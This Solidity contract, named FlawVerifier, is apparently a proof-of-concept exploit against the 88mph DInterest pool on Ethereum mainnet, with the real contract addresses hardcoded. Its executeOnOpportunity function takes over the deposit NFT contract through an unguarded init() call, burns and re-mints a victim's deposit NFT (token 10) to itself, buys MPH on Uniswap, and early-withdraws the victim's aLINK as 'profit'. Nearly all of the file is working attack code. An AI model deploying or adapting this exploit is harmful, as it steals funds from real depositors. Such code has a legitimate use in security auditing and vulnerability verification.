// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface INFTLike {
    function owner() external view returns (address);
    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
    function ownerOf(uint256 tokenId) external view returns (address);
    function mint(address to, uint256 tokenId) external;
    function burn(uint256 tokenId) external;
}

interface IUniswapV2Router {
    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function swapExactTokensForETH(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function WETH() external returns (address);
}

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IDInterestPool {
    function earlyWithdraw(uint256 depositID, uint256 fundingID) external;
    function depositNFT() external view returns (address);
    function fundingNFT() external view returns (address);
    function mphMinter() external view returns (address);
    function stablecoin() external view returns (address);
}

interface IMoneyMarket {
    function withdraw(uint256 amount) external returns (uint256);
    function deposit(uint256 amount) external;
    function totalValue() external returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0xF0b7DE03134857391d8D43Ed48e20EDF21461097; // depositNFT
    address public constant POOL = 0x904F81EFF3c35877865810CCA9a63f2D9cB7D4DD; // DInterest pool
    address public constant MPH = 0x8888801aF4d980682e47f1A9036e589479e835C5;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant ALINK = 0xA64BD6C70Cb9051F6A9ba1F163Fdc07E0DfB5F84; // stablecoin = aLINK
    address public constant MPHMINTER = 0x03577A2151A10675a9689190fE5D331Ee7ff2517;
    address public constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        _profitToken = ALINK;
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external
        pure
        returns (bytes4)
    {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    receive() external payable {}

    function executeOnOpportunity() public {
        // Step 1: Seize depositNFT ownership via init() (F-001: No reinit guard on NFT.init())
        INFTLike nft = INFTLike(TARGET);
        nft.init(address(this), "pwned", "PWN");

        // Burn token 10 (victim's deposit NFT) and re-mint to ourselves
        nft.burn(10);
        nft.mint(address(this), 10);

        // Step 2: Buy enough MPH from Uniswap V2 to cover takeBackDepositorReward
        // For earlyWithdraw, takeBackAmount = mintMPHAmount = 5381078376862078946 (~5.38 MPH)
        // SushiSwap pool has better reserves
        _buyMPH();

        // Step 3: Approve MPHMinter to pull MPH from us
        IERC20Like(MPH).approve(MPHMINTER, type(uint256).max);

        // Step 4: Early-withdraw deposit 10 (unfunded, fundingID=0)
        IDInterestPool pool = IDInterestPool(POOL);
        pool.earlyWithdraw(10, 0);

        // Step 5: Record profit - the aLINK we received
        _profitAmount = IERC20Like(ALINK).balanceOf(address(this));
    }

    function _buyMPH() internal {
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = MPH;
        
        // Buy ~5.38 MPH with a generous amount of WETH (0.2 ETH)
        IUniswapV2Router(ROUTER).swapExactETHForTokens{value: 0.2 ether}(
            1, // accept any amount
            path,
            address(this),
            block.timestamp + 1000
        );
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}
